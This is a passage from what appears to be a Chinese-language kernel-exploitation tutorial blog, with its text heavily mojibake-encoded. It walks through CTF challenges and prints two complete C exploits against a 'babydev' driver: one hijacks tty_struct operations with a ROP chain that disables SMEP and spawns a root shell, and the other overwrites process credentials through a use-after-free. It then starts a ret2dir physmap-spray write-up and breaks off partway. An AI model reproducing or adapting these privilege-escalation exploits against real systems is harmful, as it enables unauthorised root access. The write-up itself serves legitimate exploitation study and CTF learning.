id="0x02è§£æ³•1ï¼š">0x02è§£æ³•1ï¼š</h4><p><strong>å¤§ä½“æ­¥éª¤ï¼šUAF+2*stack migitation+bypass-SMEP+ret2usr</strong></p><p>æ²¡æœ‰å¼€å¯kalsrï¼Œä¸”æ™®é€šç”¨æˆ·èƒ½ç›´æ¥è¯»/proc/kallsyms</p><p>ä½†æ˜¯å¼€å¯äº†smepï¼Œéœ€è¦ropå…³æ‰å®ƒ</p><h5 id="1-æ‰¾gadget">1.æ‰¾gadget</h5><p>æˆ‘ä»¬å…ˆROPgadgetæŠŠgadgetè·‘å‡ºæ¥</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">time</span> ROPgadget <span class="hljs-comment">--binary ./vmlinux &gt; g2</span><br></code></pre></td></tr></table></figure><p>ROPgadgetä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œropperè·‘åŠå¤©ï¼Œå¡æ­»äº†</p><p><strong>ä½†æ˜¯ROPgadget è·å¾—çš„ä»£ç ç‰‡æ®µä¸­æœ‰æ—¶å€™æ²¡æœ‰iretqå’Œsysretqï¼Œæˆ‘è¿™é¢˜å°±æ²¡æœ‰ï¼Œä¸¤ç§è§£å†³åŠæ³•ï¼š</strong></p><ol><li>python è¿›è¡Œiretqç¼–ç åŒ¹é…</li><li>ida è§£ævmlinux æŸ¥æ‰¾iretqæŒ‡ä»¤</li></ol><p>æˆ‘è¿™é‡Œé€‰æ‹©ç¬¬äºŒç§ï¼Œidaæ‰“å¼€vmlinuxï¼Œalt+tï¼Œæ‰¾iretq</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8.png" alt="8"></p><p>æ³¨æ„<strong>mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</strong>è¿™ä¸ªæŒ‡ä»¤</p><p>\xc3å°±æ˜¯retçš„æ±‡ç¼–ï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œèƒ½æ‰§è¡Œçš„è¯ï¼Œ jmp 0xffffffff8181bf7eç›¸å½“äºret</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/10.png" alt="10"></p><h5 id="2-å…·ä½“æ­¥éª¤">2.å…·ä½“æ­¥éª¤</h5><p>openæ‰“å¼€<code>/dev/ptmx</code>è®¾å¤‡æ—¶,å°±ä¼šåˆ›å»ºä¸€ä¸ª <code>tty_struct</code> ç»“æ„ä½“ï¼Œè¿™ä¸ª<code>tty_struct</code> ç»“æ„ä½“é‡Œå­˜æ”¾ç€tty_operationsæŒ‡é’ˆï¼Œ</p><blockquote><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF åŠ«æŒ <code>/dev/ptmx</code> è¿™ä¸ªè®¾å¤‡çš„ <code>tty_struct</code> ç»“æ„ä½“ä¸å…¶å†…éƒ¨çš„ <code>tty_operations</code> å‡½æ•°è¡¨ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬å¯¹è¿™ä¸ªè®¾å¤‡è¿›è¡Œç›¸åº”æ“ä½œï¼ˆå¦‚writeã€ioctlï¼‰æ—¶ä¾¿ä¼šæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„æ¶æ„å‡½æ•°æŒ‡é’ˆ</p></blockquote><p>å°±æ˜¯å½“ä½¿ç”¨writeå‡½æ•°æ—¶ï¼Œä¼šè°ƒç”¨tty_structçš„tty_operationsé‡Œçš„writeæŒ‡é’ˆ</p><p>(tty_operationsåœ¨tty_structçš„ä¸‹æ ‡3å¤„)</p><p>(å¯¹åº”writeçš„æŒ‡é’ˆåœ¨tty_operationsä¸‹æ ‡7å¤„)</p><p>å› ä¸ºæ˜¾ç„¶æ²¡ogè¿™ç§ä¸€ä¸ªåœ°å€è¾¾æˆç›®æ ‡ï¼Œæ‰€ä»¥è¦è¿ç§»åˆ°æ ˆä¸Š</p><p>åœ¨è°ƒç”¨<code>tty_operations-&gt;write</code>æ—¶ï¼Œ<strong>å…¶raxå¯„å­˜å™¨ä¸­å­˜æ”¾çš„ä¾¿æ˜¯tty_operationsç»“æ„ä½“çš„åœ°å€</strong>ï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ä¸­æ‰¾åˆ°å½¢å¦‚<code>mov rsp, rax</code>çš„gadgetï¼Œä¾¿èƒ½å¤ŸæˆåŠŸåœ°å°†æ ˆè¿ç§»åˆ°<code>tty_operations</code>ç»“æ„ä½“çš„å¼€å¤´</p><p>æ‰€ä»¥ç¬¬ä¸€æ¬¡è¿ç§»rspå°±æ˜¯åˆ©ç”¨ ç¨‹åºè¿è¡Œåˆ°é‚£æ—¶raxä¿å­˜çš„fake_operationså¼€å¤´åœ°å€</p><p>æˆ‘ä»¬ç”¨pop raxåœ¨fake_operationså¼€å¤´å¸ƒç½®å¥½raxä¸ºropé“¾çš„åœ°å€ï¼Œç¬¬äºŒæ¬¡è¿ç§»rspåˆ°ropé“¾ï¼Œå°±èƒ½æ‰§è¡Œæˆ‘ä»¬çš„ropé“¾äº†</p><p>ropé“¾çš„å†…å®¹æ˜¯(å…³é—­smep-&gt;ret2usr-&gt;å†…æ ¸æ€get_root-&gt;ç”Ÿæˆshell-&gt;ç€é™†å›ç”¨æˆ·æ€)</p><h5 id="3-exp">3.exp</h5><p>å€¼å¾—æ³¨æ„çš„æ˜¯éå†ç¬¦å·è¡¨ä¼šæ‰¾åˆ°å¥½å‡ ä¸ªcommit_credså’Œprepare_kernel_cred_addrï¼Œæˆ‘ä»¬æ‰¾åˆ°è¿™ä¸¤ä¸ªç›´æ¥é€€å‡ºéå†å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc new_exp.c -static -masm=intel -g -o new_exp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /proc/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(commit_creds_addr&amp;&amp;prepare_kernel_cred_addr)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds_addr;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-comment">//sleep(10);</span><br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">13</span>],p=<span class="hljs-number">0</span>;<br>    rop[p++]= <span class="hljs-number">0xffffffff810d238d</span>; <span class="hljs-comment">//pop rdi ; ret</span><br>    rop[p++]= <span class="hljs-number">0x6f0</span>;<br>    rop[p++]= <span class="hljs-number">0xffffffff81004d80</span>; <span class="hljs-comment">//mov cr4, rdi ; pop rbp ; ret</span><br>    rop[p++]= <span class="hljs-number">0</span>;<br>    rop[p++]= getRootPrivilige;<br>    rop[p++]= <span class="hljs-number">0xffffffff81063694</span>; <span class="hljs-comment">//swapgs ; pop rbp ; ret</span><br>    rop[p++]= <span class="hljs-number">0</span>; <br>    rop[p++]= <span class="hljs-number">0xFFFFFFFF8181A797</span>;<span class="hljs-comment">//iretq ;ret</span><br>    rop[p++]= spawn_shell;<span class="hljs-comment">//rip</span><br>    rop[p++] = user_cs;<br>    rop[p++] = user_rflags;<br>    rop[p++] = user_sp;<br>    rop[p++] = user_ss;<br><br><span class="hljs-type">size_t</span> fake_op[<span class="hljs-number">0x10</span>];<br>fake_op[<span class="hljs-number">0</span>]=<span class="hljs-number">0xffffffff8100ce6e</span>; <span class="hljs-comment">// pop rax ; ret</span><br>fake_op[<span class="hljs-number">1</span>]=rop;<br>fake_op[<span class="hljs-number">2</span>]=<span class="hljs-number">0xffffffff8181bfc5</span>; <span class="hljs-comment">//mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span><br>fake_op[<span class="hljs-number">7</span>]=<span class="hljs-number">0xffffffff8181bfc5</span>; <span class="hljs-comment">//mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span><br><br><span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>); <span class="hljs-comment">//tty_struct size 0x2e0</span><br>close(fd1);<br><br><span class="hljs-type">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];<br><span class="hljs-type">int</span> fd3=open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,<span class="hljs-number">2</span>);<br><br>read(fd2,fake_tty,<span class="hljs-number">0x20</span>);<br>fake_tty[<span class="hljs-number">3</span>]=fake_op;<br>write(fd2, fake_tty, <span class="hljs-number">0x20</span>);<br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>write(fd3, buf, <span class="hljs-number">0x8</span>);<span class="hljs-comment">//trigger</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>æˆåŠŸææƒ</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9.png" alt="9"></p><h4 id="0x03è§£æ³•2ï¼š">0x03è§£æ³•2ï¼š</h4><p><strong>å¤§ä½“æ­¥éª¤ï¼šUAF-&gt;ä¿®æ”¹cred</strong></p><p>æ–°ç‰ˆæœ¬å†…æ ¸å°±ä¸èƒ½ç”¨è¿‡å»çš„ç®€å•åšæ³•äº†ï¼Œå› ä¸ºï¼š</p><blockquote><p>æ–°è¿›ç¨‹çš„credç»“æ„ä½“ä¼šæœ‰ä¸€ä¸ªå•ç‹¬çš„åŒºåŸŸè¿›è¡Œç”³è¯·ï¼Œå› æ­¤UAFæ¼æ´æ— æ³•åˆ©ç”¨æˆåŠŸï¼Œè¿™ç§æ–°çš„ç‰¹å¾å«åšlockdown</p></blockquote><p>æ­¤å¤–æˆ‘çš„gccç¼–è¯‘å‡ºæ¥çš„æ‰“ä¸é€š(ç”¨wikié‡Œç»™çš„æ‰“çš„é€šï¼Œä¹Ÿè®¸æ˜¯ç¼–è¯‘å™¨é—®é¢˜)ï¼Œæ‡’å¾—æ•´äº†</p><h5 id="1-expï¼š">1.expï¼š</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc uaf.c -static -o uaf</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd1=open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> fd2=open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br><br>    ioctl(fd1,<span class="hljs-number">0x10001</span>,<span class="hljs-number">0xa8</span>);<br>    close(fd1);<br>    <br>    <span class="hljs-type">int</span> pid=fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> zeros[<span class="hljs-number">40</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2,zeros,<span class="hljs-number">32</span>);<br>    <br>        <span class="hljs-keyword">if</span>(getuid()==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]get root&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125;<br>    &#125;<br>    close(fd2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="04-ret2dir">04.ret2dir</h2><p>ret2dirå³ return to direct mapping areaï¼Œ<strong>åœ¨å†…æ ¸ç©ºé—´ä¸­éƒ½èƒ½é€šè¿‡è¿™å—å†…å­˜åŒºåŸŸè®¿é—®åˆ°</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½®æ¶æ„æ•°æ®ï¼Œä¹‹åå†åœ¨å†…æ ¸ç©ºé—´çš„è¿™å—åŒºåŸŸä¸­æ‰¾åˆ°æˆ‘ä»¬çš„ç”¨æˆ·ç©ºé—´æ•°æ®å¯¹åº”çš„å†…æ ¸ç©ºé—´åœ°å€å³å¯ï¼Œè¿™ä¾¿æ˜¯ <code>ret2dir</code> â€”â€”<strong>é€šè¿‡å†…æ ¸ç©ºé—´åœ°å€è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´æ•°æ®</strong></p><h3 id="MINI-LCTF2022-kgadget">MINI-LCTF2022 - kgadget</h3><h4 id="0x01ç¨‹åºåˆ†æ-2">0x01ç¨‹åºåˆ†æ</h4><h5 id="1-ä¿æŠ¤æŸ¥çœ‹">1.ä¿æŠ¤æŸ¥çœ‹</h5><p>å¼€å¯äº†smep/smapï¼Œæ²¡å¼€kaslrï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œpti=onï¼Œå…¶å®æ˜¯å¼€å¯äº†KPTIï¼Œæ‰€ä»¥ä¸èƒ½å…³é—­smepæ¥ret2usr</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684501618947.png" alt="1"></p><h5 id="2-æŸ¥çœ‹init">2.æŸ¥çœ‹init</h5><p><code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code></p><p>éç‰¹æƒç”¨æˆ·ä¸èƒ½ä½¿ç”¨dmesgæŸ¥çœ‹æ¥è‡ªå†…æ ¸æ—¥å¿—ç¼“å†²åŒºçš„æ¶ˆæ¯</p><p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code></p><p>éç‰¹æƒç”¨æˆ·éƒ½æ— æ³•è¯»å–å†…æ ¸ç¬¦å·åœ°å€</p><p><code>chmod 400 /flag</code></p><p>åªæœ‰rootå¯ä»¥è¯»flag</p><p>è½½å…¥äº†LKM kgadget.koï¼Œæ˜¾ç„¶é‡ç‚¹å…³æ³¨è¿™ä¸ª</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684501618947.png" alt="2"></p><h5 id="3-åˆ†ækgadget-ko">3.åˆ†ækgadget.ko</h5><h6 id="ä¸€-ä¿æŠ¤">ä¸€.ä¿æŠ¤</h6><p>å¼€å¯äº†canaryï¼Œnx</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3-1684501618947.png" alt="3"></p><h6 id="äºŒ-å‡½æ•°">äºŒ.å‡½æ•°</h6><p>å°±é‡ç‚¹åˆ†æioctl</p><p>æˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°æ˜¯114514çš„è¯ï¼Œä¼šè§£æç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡é’ˆæ‰§è¡Œ</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4-1684501618947.png" alt="4"></p><p>å‰é¢qmemcpyè¿™æ®µæˆ‘ä»¬ä¸å¥½ç†è§£åšäº†å•¥ï¼Œæˆ‘ä»¬çœ‹æ±‡ç¼–</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684501618947.png" alt="5"></p><p>å¯ä»¥çœ‹åˆ°è¿™è¾¹[rax-0xa8]æ˜¯pt_regsï¼Œå¯ä»¥çœ‹åˆ°å°±æ˜¯æŠŠpt_regsçš„r15,r14,r13,r12,rbp,r11,r10èµ‹å€¼â€œattrnba3â€</p><p>æœ€åcall rbx,rbxå·²ç»æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°äº†ï¼Œä¹Ÿå°±æ˜¯è§£æç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡é’ˆæ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="0x02è§£é¢˜æ­¥éª¤">0x02è§£é¢˜æ­¥éª¤</h4><p><strong>ret2dir + physmap spray</strong></p><p>æ”»å‡»æ–¹æ³•å°±æ˜¯return to direct mapping areaï¼ˆçº¿æ€§æ˜ å°„åŒºï¼‰ï¼Œåˆ©ç”¨å†…æ ¸çº¿æ€§æ˜ å°„åŒºå¯¹æ•´ä¸ªç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸Šçš„åœ°å€è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´çš„æ•°æ®ã€‚</p><h5 id="1-ç”³è¯·å†…å­˜">1.ç”³è¯·å†…å­˜</h5><p><code>mmap(NULL, sysconf(_SC_PAGESIZE), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</code></p><p>ï¼ˆmmapå¦‚æ­¤ç”³è¯·çš„è¯ï¼Œä¸€ä¸ªé¡µå¤§å°ï¼Œå†…å­˜å¯è¯»å¯å†™ï¼ŒåŒ¿åæ˜ å°„ï¼‰</p><p>æˆ‘ä»¬ä»¥ä¸€ä¸ªé¡µçš„å¤§å°æ¥ç”³è¯·å†…å­˜ï¼Œåç»­è¦å¾€é‡Œé¢å†™å…¥payloadï¼Œç”¨physmap sprayæ‰‹æ³•ï¼Œ mmap å–·å°„å¤§é‡çš„ç‰©ç†å†…å­˜å†™å…¥åŒæ ·çš„ payload(ropé“¾)</p><blockquote><p><strong>ä½¿ç”¨ mmap å–·å°„å¤§é‡çš„ç‰©ç†å†…å­˜å†™å…¥åŒæ 